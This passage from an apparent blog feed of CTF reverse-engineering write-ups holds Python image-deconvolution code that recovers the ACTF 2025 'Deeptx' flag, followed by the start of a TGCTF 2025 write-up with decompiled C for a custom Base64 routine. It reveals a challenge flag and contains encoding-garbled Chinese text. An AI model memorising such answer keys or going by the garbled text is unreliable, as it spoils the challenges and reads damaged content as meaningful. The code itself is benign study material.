class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblur_image</span>(<span class="params">blurred_image, motion_kernel, num_iterations=<span class="number">30</span>, learning_rate=<span class="number">0.01</span></span>):</span><br><span class="line">    kernel = motion_kernel.reshape(<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    padded_kernel = np.zeros((<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">    padded_kernel[:<span class="number">16</span>, :<span class="number">16</span>] = kernel</span><br><span class="line">    kernel_fft = np.fft.fft2(padded_kernel)</span><br><span class="line">    blurred_fft = np.fft.fft2(blurred_image)</span><br><span class="line">    K = <span class="number">0.01</span></span><br><span class="line">    kernel_fft_conj = np.conj(kernel_fft)</span><br><span class="line">    deblurred_fft = (kernel_fft_conj * blurred_fft) / (np.<span class="built_in">abs</span>(kernel_fft)**<span class="number">2</span> + K)</span><br><span class="line">    deblurred = np.real(np.fft.ifft2(deblurred_fft))</span><br><span class="line">    deblurred = np.clip(deblurred, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> deblurred.astype(np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_and_process_image</span>(<span class="params">image_path, motion_data</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    img_array = np.array(img)</span><br><span class="line">    motion_kernel = np.array(motion_data)</span><br><span class="line">    deblurred_img = deblur_image(img_array, motion_kernel)</span><br><span class="line">    <span class="keyword">return</span> deblurred_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    motion_data = np.array([</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0055596731</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0055596731</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>])</span><br><span class="line">    </span><br><span class="line">    image_path = <span class="string">r&quot;Layer2_Decrypted.bmp&quot;</span></span><br><span class="line">    </span><br><span class="line">    original_img = np.array(Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    deblurred_img = load_and_process_image(image_path, motion_data)</span><br><span class="line">    </span><br><span class="line">    Image.fromarray(deblurred_img).save(<span class="string">&#x27;deblurred_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°ä¸€å¼ å¯ä»¥çœ‹æ¸…flagçš„å›¾ç‰‡ã€‚</p><p><img src="/2025/04/27/ACTF-Deeptx/image-3.png" alt="alt text"></p><p>å¾—åˆ°flag <code>ACTF&#123;DeEptCUdAR1VQVZ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ACTF2025-Reverse-Deeptx-WP&quot;&gt;&lt;a href=&quot;#ACTF2025-Reverse-Deeptx-WP&quot; class=&quot;headerlink&quot; title=&quot;ACTF2025 Reverse Deeptx WP&quot;&gt;&lt;/a&gt;ACTF2025</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>TGCTF 2025 é€†å‘WP</title>
    <link href="https://tkazer.github.io/2025/04/13/TGCTF2025/"/>
    <id>https://tkazer.github.io/2025/04/13/TGCTF2025/</id>
    <published>2025-04-13T11:12:25.000Z</published>
    <updated>2025-04-16T04:16:50.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TGCTF-2025-é€†å‘WP"><a href="#TGCTF-2025-é€†å‘WP" class="headerlink" title="TGCTF 2025 é€†å‘WP"></a>TGCTF 2025 é€†å‘WP</h1><p>æˆ˜é˜Ÿåï¼šä¸çŸ¥é“</p><p>æ’åï¼š3</p><p>ä¸Šæ¬¡XYCTFæ˜¯ç—›å¤±Webæ‰‹ï¼Œè¿™æ¬¡åˆæ˜¯ç—›å¤±Pwnæ‰‹ï¼Œå•¥æ—¶å€™èƒ½å…¨é˜Ÿä¸€èµ·æ‰“ä¸€æ¬¡ï¼ˆï¼‰ã€‚è¿™æ¬¡Reéš¾åº¦è¿˜è¡Œï¼Œç£¨ç£¨å”§å”§æ•´äº†ä¸€ä¼šä¹Ÿæ˜¯AKäº†ã€‚</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64 å˜ç§åŠ å¯†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_7FF7DC6C10E0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// edi</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v27; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v30[<span class="number">80</span>]; <span class="comment">// [rsp+20h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+90h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v30, <span class="string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v2;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(a1 + v2) );</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="type">int</span>)v2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v2 == <span class="number">3</span> * ((<span class="type">int</span>)v2 / <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">2</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4 + <span 